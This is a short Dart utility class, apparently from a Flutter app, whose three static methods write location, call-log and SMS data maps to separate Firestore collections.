// lib/core/utils/firebase_manager.dart

import 'package:cloud_firestore/cloud_firestore.dart';

class FirebaseManager {
  static final FirebaseFirestore _firestore = FirebaseFirestore.instance;

  static Future<void> syncLocationData(Map<String, dynamic> locationData) async {
    await _firestore.collection('locations').add(locationData);
  }

  static Future<void> syncCallLogData(Map<String, dynamic> callLogData) async {
    await _firestore.collection('callLogs').add(callLogData);
  }

  static Future<void> syncSmsData(Map<String, dynamic> smsData) async {
    await _firestore.collection('smsLogs').add(smsData);
  }
}
